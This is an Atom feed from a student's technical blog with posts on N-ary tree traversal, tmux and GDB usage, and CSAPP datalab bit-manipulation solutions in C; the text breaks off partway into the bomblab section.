<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rayii&#39;s blog</title>
  
  
  <link href="https://1xueyu1.github.io/atom.xml" rel="self"/>
  
  <link href="https://1xueyu1.github.io/"/>
  <updated>2024-03-16T15:14:00.611Z</updated>
  <id>https://1xueyu1.github.io/</id>
  
  <author>
    <name>Rayii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF</title>
    <link href="https://1xueyu1.github.io/2024/03/15/CTF/"/>
    <id>https://1xueyu1.github.io/2024/03/15/CTF/</id>
    <published>2024-03-15T13:34:12.000Z</published>
    <updated>2024-03-16T15:14:00.611Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-IDA基础操作"><a href="#1-IDA基础操作" class="headerlink" title="1.IDA基础操作"></a>1.IDA基础操作</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h1&gt;&lt;h2 id=&quot;1-IDA基础操作&quot;&gt;&lt;a href=&quot;#1-IDA基础操作&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="https://1xueyu1.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>N叉树的遍历</title>
    <link href="https://1xueyu1.github.io/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"/>
    <id>https://1xueyu1.github.io/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/</id>
    <published>2024-02-22T08:08:17.000Z</published>
    <updated>2024-02-22T08:43:57.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N叉树的遍历"><a href="#N叉树的遍历" class="headerlink" title="N叉树的遍历"></a>N叉树的遍历</h1><p><a href="https://leetcode.cn/problems/n-ary-tree-preorder-traversal/description/?envType=daily-question&envId=2024-02-18">589. N 叉树的前序遍历 - 力扣（LeetCode）</a></p><p>根据我以前的二叉树的前序遍历的迭代写法，发现这道题写不清楚。然后看题解，发现<strong>代码随想录</strong>的前中后序遍历的同一写法写起来简单而且也容易理解。</p><p><a href="https://1xueyu1.github.io/2023/11/20/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/">二叉树的遍历 | Rayii’s blog (1xueyu1.github.io)</a></p><p>下面是二叉树同一迭代法。</p><p><a href="https://www.programmercarl.com/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%BB%9F%E4%B8%80%E8%BF%AD%E4%BB%A3%E6%B3%95.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// N叉树前序遍历的迭代写法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)<span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;Node*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())<span class="comment">// 出栈时反过来就是从左往右</span></span><br><span class="line">        &#123;</span><br><span class="line">            root = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">// 先处理中</span></span><br><span class="line">            <span class="type">int</span> n = root-&gt;children.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(root-&gt;children[i]);<span class="comment">// 从右往左</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;N叉树的遍历&quot;&gt;&lt;a href=&quot;#N叉树的遍历&quot; class=&quot;headerlink&quot; title=&quot;N叉树的遍历&quot;&gt;&lt;/a&gt;N叉树的遍历&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/n-ary-tree-preor</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
  </entry>
  
  <entry>
    <title>tmux-tutorial</title>
    <link href="https://1xueyu1.github.io/2024/02/19/tmux/"/>
    <id>https://1xueyu1.github.io/2024/02/19/tmux/</id>
    <published>2024-02-19T12:36:09.000Z</published>
    <updated>2024-03-16T13:56:03.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tmux-tutorial"><a href="#tmux-tutorial" class="headerlink" title="tmux-tutorial"></a>tmux-tutorial</h1><h2 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h2><h3 id="启动会话"><a href="#启动会话" class="headerlink" title="启动会话"></a>启动会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux new -s &lt;name&gt; // 启动并命名会话</span><br></pre></td></tr></table></figure><h3 id="查看所有会话"><a href="#查看所有会话" class="headerlink" title="查看所有会话"></a>查看所有会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux ls</span><br></pre></td></tr></table></figure><h3 id="分离会话"><a href="#分离会话" class="headerlink" title="分离会话"></a>分离会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux detach</span><br></pre></td></tr></table></figure><h3 id="恢复会话"><a href="#恢复会话" class="headerlink" title="恢复会话"></a>恢复会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tmux at [-t name]</span><br><span class="line"># at 是 attach 的缩写</span><br><span class="line">tmux attach [-t name]</span><br><span class="line"></span><br><span class="line">#e.g.</span><br><span class="line">tmux at -t debug</span><br></pre></td></tr></table></figure><h3 id="重命名会话"><a href="#重命名会话" class="headerlink" title="重命名会话"></a>重命名会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tmux rename-session -t 0 &lt;new-name&gt;</span><br></pre></td></tr></table></figure><h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tmux kill-session -t &lt;name&gt;</span><br><span class="line"># 关闭所有会话</span><br><span class="line">$ tmux kill-server</span><br></pre></td></tr></table></figure><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>所有快捷键之前要按<code>Ctrl + b</code></p><ul><li><p><code>c</code> 新建窗口，此时当前窗口会切换至新窗口，不影响原有窗口的状态</p></li><li><p><code>p</code> 切换至上一窗口</p></li><li><p><code>n</code> 切换至下一窗口</p></li><li><p><code>,</code> 重命名窗口，可以使用中文，重命名后能在 tmux 状态栏更快速的识别窗口 id</p></li><li><p><code>0</code> 切换至 0 号窗口，使用其他数字 id 切换至对应窗口</p></li><li><p><code>f</code> 根据窗口名搜索选择窗口，可模糊匹配</p></li></ul><h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><ul><li><code>?</code> 列出所有快捷键；按q返回</li><li><code>:</code> 进入命令行模式；此时可以输入支持的命令，例如kill-server可以关闭服务器</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tmux-tutorial&quot;&gt;&lt;a href=&quot;#tmux-tutorial&quot; class=&quot;headerlink&quot; title=&quot;tmux-tutorial&quot;&gt;&lt;/a&gt;tmux-tutorial&lt;/h1&gt;&lt;h2 id=&quot;会话操作&quot;&gt;&lt;a href=&quot;#会话操作&quot;</summary>
      
    
    
    
    <category term="工具" scheme="https://1xueyu1.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>GDB-tutorial</title>
    <link href="https://1xueyu1.github.io/2024/02/19/GDB/"/>
    <id>https://1xueyu1.github.io/2024/02/19/GDB/</id>
    <published>2024-02-19T09:10:41.000Z</published>
    <updated>2024-02-19T09:23:58.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GDB-tutorial"><a href="#GDB-tutorial" class="headerlink" title="GDB-tutorial"></a>GDB-tutorial</h1><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.s # 可以得到bomb对应的汇编</span><br></pre></td></tr></table></figure><p>Linux strings命令</p><p>strings - print the strings of printable characters in files.</p><p>意思是， 打印文件中可打印的字符。 我来补充一下吧， 这个文件可以是文本文件（test.c）, 可执行文件(test), 动态链接库(test.o), 静态链接库(test.a)</p><h2 id="GDB-使用"><a href="#GDB-使用" class="headerlink" title="GDB 使用"></a>GDB 使用</h2><ul><li><p><code>run/r</code> : 运行程序</p></li><li><p><code>break/b &lt;function_name&gt;/&lt;address&gt;</code> : 在函数名称或地址下断点</p></li><li><p><code>continue/c</code> : 继续运行程序</p></li><li><p><code>info registers/r</code> : 显示所有寄存器的信息</p></li><li><p><code>print/p $rax</code> : 打印某个寄存器的值 (in decimal)</p></li><li><p><code>p/x $rax </code>: 打印某个寄存器的值 (in hex)</p></li><li><p><code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt; </code> 和<code>display</code>用法一样。 将<code>x</code>替换为<code>display</code>即可</p><ul><li><p><code>&lt;u&gt;</code> 是要显示的单位大小 <code>eg: b(1byte), h(2byte), w(4byte), g(8byte)</code></p></li><li><p><code>&lt;f&gt;</code> 是要显示它的格式 <code>eg: d(decimal), x(hexadecimal), s(string), i(instruction)</code></p><p>The address can be specified using a register name, symbol name, or<br>absolute address. Additionally, you can supply mathematical expressions when specifying the address.</p></li><li><p><code>&lt;n&gt;</code>是要显示的元素个数</p></li><li><p><code>eg:</code></p><ul><li><code>x/8i $rip</code> will print the next 8 instructions from the current instruction pointer</li><li><code>x/16i main</code> will print the first 16 instructions of main</li><li><code>x/16gx $rsp</code> will print the first 16 values on the stack</li><li><code>x/gx $rbp-0x32</code>will print the local variable stored there on the stack</li></ul></li></ul></li><li><p><code>disassemble/disas &lt;function_name&gt;</code> : 将函数的汇编代码显示出来</p></li><li><p><code>set disassembly-flavor intel</code>: You will probably want to view your instructions using the CORRECT assembly syntax.</p></li><li><p><code>set</code> : 给寄存器赋值 <code>eg: set $rax = 0</code></p></li><li><p><code>stepi/si &lt;n&gt;</code>： 执行 n 条指令，会进入函数</p></li><li><p><code>nexti/ni &lt;n&gt;</code>： 执行 n 条指令，不会进入函数</p></li><li><p><code>finish</code> : 执行到当前函数结尾</p></li><li><p><code>layout regs</code>: 将界面变为如下格式</p></li><li><p><img src="/2024/02/19/GDB/image-20240122170103582.png" alt="image-20240122170103582"></p></li></ul><h3 id="GDB-script"><a href="#GDB-script" class="headerlink" title="GDB script"></a>GDB script</h3><p>You can write your commands to some file, for example <code>x.gdb</code>, and then launch gdb using the flag <code>-x &lt;PATH_TO_SCRIPT&gt;</code>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GDB-tutorial&quot;&gt;&lt;a href=&quot;#GDB-tutorial&quot; class=&quot;headerlink&quot; title=&quot;GDB-tutorial&quot;&gt;&lt;/a&gt;GDB-tutorial&lt;/h1&gt;&lt;h2 id=&quot;反编译&quot;&gt;&lt;a href=&quot;#反编译&quot; class</summary>
      
    
    
    
    <category term="工具" scheme="https://1xueyu1.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>CSAPP-Lab</title>
    <link href="https://1xueyu1.github.io/2024/02/17/CSAPP/"/>
    <id>https://1xueyu1.github.io/2024/02/17/CSAPP/</id>
    <published>2024-02-17T14:17:36.000Z</published>
    <updated>2024-02-27T12:51:59.574Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/505497911">CSAPP一键环境配置、完成8个lab总结 - 知乎 (zhihu.com)</a></p><p>[toc]</p><h1 id="datalab"><a href="#datalab" class="headerlink" title="datalab"></a>datalab</h1><p>由介绍可知</p><p><code>bits.c</code>是我们写代码的文件</p><p><code>dlc</code>检查代码是否符合要求的，没问题的话就不返回消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; ./dlc bits,c</span><br><span class="line">unix&gt; ./dlc -e bits.c  // 计算每个函数用了多少个操作符</span><br></pre></td></tr></table></figure><p><code>btest</code>对合法代码测试是否正确</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; make btest </span><br><span class="line">unix&gt; ./btest [optional cmd line args]</span><br><span class="line">// 上面两行编译并执行程序, 每次修改bits.c文件后都要重新编译</span><br><span class="line"></span><br><span class="line">unix&gt; ./btest -h</span><br><span class="line">Usage: ./btest [-hg] [-r &lt;n&gt;] [-f &lt;name&gt; [-1|-2|-3 &lt;val&gt;]*] [-T &lt;time limit&gt;]</span><br><span class="line">    -1 &lt;val&gt;  Specify first function argument</span><br><span class="line">    -2 &lt;val&gt;  Specify second function argument</span><br><span class="line">    -3 &lt;val&gt;  Specify third function argument</span><br><span class="line">    -f &lt;name&gt; Test only the named function</span><br><span class="line">    -g        Format output for autograding with no error messages</span><br><span class="line">    -h        Print this message</span><br><span class="line">    -r &lt;n&gt;    Give uniform weight of n for all problems</span><br><span class="line">    -T &lt;lim&gt;  Set timeout limit to lim</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://zhuanlan.zhihu.com/p/650545012">【CSAPP笔记】2.4 浮点运算 - 知乎 (zhihu.com)</a></p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><h4 id="1-浮点数表示"><a href="#1-浮点数表示" class="headerlink" title="1.浮点数表示"></a>1.浮点数表示</h4><p>浮点数能够表示的数据类型为$x*2^y$ ，其中x和y均为整数。</p><p>对于那些不能够表示为$x*2^y$格式的数据，浮点数只能够近似表示。</p><p>IEEE <strong>规定</strong>了单精度浮点数格式(32位)和双精度浮点数格式(64位)。它们共同的特点为，按照低位到高位分别划分了三个域：frac(小数字段)，exp(指数字段)，s(符号位)。</p><p>单精度：frac 23位，exp 8位，s 1位。共计32位。</p><p>双精度：frac 52位，exp11位，s 1位。共计64位。</p><p>以单精度为例，将所有的浮点数<strong>规定</strong>为3个种类</p><p><img src="/2024/02/17/CSAPP/v2-97027a419936c42504d0bb371e399c4a_r.jpg" alt="img"></p><p>1、Normalized(规格化)；</p><p>2、Denormalized(非规格化)；</p><p>3、Special Value(特殊值)，具体分为Infinity(无穷)和NAN(不是一个数)。</p><ul><li><strong>第三类情况，Special Value</strong></li></ul><p><strong>当exp 为 全1时，表示的是special value</strong>。</p><p>1、若frac为全0，表示无穷。</p><p>2、当frac不为全0时，表示NAN(不是一个数)。</p><ul><li><strong>第一类情况 Normalized</strong></li></ul><p><strong>当exp 为 既非全0 也非全1时，表示的是Normalized</strong> 。</p><ul><li><strong>第二类情况</strong></li></ul><p><strong>当exp 为全0时，表示的是Denormalized</strong> 。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>用<code>&amp;</code>, <code>~</code> 实现异或操作<code>^</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int bitXor(int x, int y) &#123;</span><br><span class="line">return ~(~(x &amp; ~y) &amp; ~(~x &amp; y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>返回补码中的最小值<code>-128 0x10000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int tmin(void) &#123;</span><br><span class="line">return 0x1 &lt;&lt; 31;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>如果<code>x</code>是二进制最大值<code>0x7fffffff</code>返回1，否则返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int isTmax(int x) &#123;</span><br><span class="line">   int t = (x + 1); </span><br><span class="line">   x ^= t;</span><br><span class="line">   x = ~x; // 三行代码使得`0x7fffffff`变为`0x0`</span><br><span class="line">   // 接下来排除 x 为 -1 的情况</span><br><span class="line">   t = !t; // 如果 x = -1, 可知 t = 0, 否则 t = 0x100000...</span><br><span class="line">   x = x + t; // 即可排除-1的干扰</span><br><span class="line">   return !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>如果 x 的奇数位上都是1则返回1，否则返回0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0xaa</span>;</span><br><span class="line">    t = t + (t &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    t = t + (t &lt;&lt; <span class="number">16</span>); <span class="comment">// 得到 0xaaaaaaaa</span></span><br><span class="line">    <span class="keyword">return</span> !((t &amp; x) ^ t); <span class="comment">// t &amp; x 清除无关数位再与t异或得到0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>返回x的相反数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>通过位级运算计算 <code>x</code> 是否在 0x30 - 0x39 范围内就是这个题的解决方案。那如何用位级运算来操作呢？我们可以使用两个数，一个数是加上比0x39大的数后符号由正变负，另一个数是加上比0x30小的值时是负数。这两个数是代码中初始化的 <code>upperBound</code> 和 <code>lowerBound</code>，然后加法之后获取其符号位判断即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign = <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> upperBound = ~(sign|<span class="number">0x39</span>);</span><br><span class="line">  <span class="type">int</span> lowerBound = ~<span class="number">0x2f</span>;</span><br><span class="line">  upperBound = sign&amp;(upperBound+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  lowerBound = sign&amp;(lowerBound+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !(upperBound|lowerBound);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>使用位级运算实现C语言中的 <code>x?y:z</code>三目运算符。又是位级运算的一个使用技巧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int conditional(int x, int y, int z) &#123;</span><br><span class="line">  x = !!x;</span><br><span class="line">  x = ~x+1;</span><br><span class="line">  return (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们根据 <code>x</code> 的布尔值转换为全0或全1是不是更容易解决了，即 <code>x==0</code> 时位表示是全0的， <code>x!=0</code> 时位表示是全1的。这就是1-2行代码，通过获取其布尔值0或1，然后求其补码（0的补码是本身，位表示全0；1的补码是-1，位表示全1）得到想要的结果。然后通过位运算获取最终值。</p><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>用位运算实现<code>&lt;=</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="type">int</span> negX=~x+<span class="number">1</span>;<span class="comment">//-x</span></span><br><span class="line">  <span class="type">int</span> addX=negX+y;<span class="comment">//y-x</span></span><br><span class="line">  <span class="type">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>; <span class="comment">//y-x的符号</span></span><br><span class="line">  <span class="type">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;<span class="comment">//最大位为1的32位有符号数</span></span><br><span class="line">  <span class="type">int</span> xLeft = x&amp;leftBit;<span class="comment">//x的符号</span></span><br><span class="line">  <span class="type">int</span> yLeft = y&amp;leftBit;<span class="comment">//y的符号</span></span><br><span class="line">  <span class="type">int</span> bitXor = xLeft ^ yLeft;<span class="comment">//x和y符号相同标志位，相同为0不同为1</span></span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//符号相同标志位格式化为0或1</span></span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));<span class="comment">//返回1有两种情况：符号相同标志位为0（相同）位与 y-x 的符号为0（y-x&gt;=0）结果为1；符号相同标志位为1（不同）位与x的符号位为1（x&lt;0）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x, y 符号相同时可以通过x-y的符号位判断两数大小</p><p>x, y 符号不同时可以通过判断x的符号位是否为1</p><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>实现逻辑非 <code>!</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(x | (~x + 1))除x &#x3D;&#x3D; 0外都是0xffffffff，当x &#x3D;&#x3D; 0时为0x0</p><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>计算一个数最少需要多少位表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="type">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);<span class="comment">//如果x为正则不变，否则按位取反 （解释见下面思路）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不断缩小范围</span></span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;<span class="comment">//高十六位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：</p><p>对于一个正数 <code>0x0110101</code>, 因为从符号位到第一个 1 时都是 0 ， 所以从第一个 1 到最后一位能记录下来这个正数。</p><p>对于一个负数<code>0x11101</code>, 为了避免符号位的影响，所以记录 0 的最高位，发现取反后是找到 1 的最高位，所以和正数的逻辑一样且代码可复用。</p><p>因此<code>x = (sign&amp;~x)|(~sign&amp;x)</code>当 x 为正数就不变，为负数就取反。 </p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>求2乘一个浮点数</p><h1 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h1><p>汇编语言的学习就不说了，网上教程很多。</p><h2 id="GDB使用"><a href="#GDB使用" class="headerlink" title="GDB使用"></a>GDB使用</h2><p>见我的文章GDB使用</p><p><code>disas func_name</code>查看某函数的汇编代码</p><p>等等</p><h2 id="tmux使用"><a href="#tmux使用" class="headerlink" 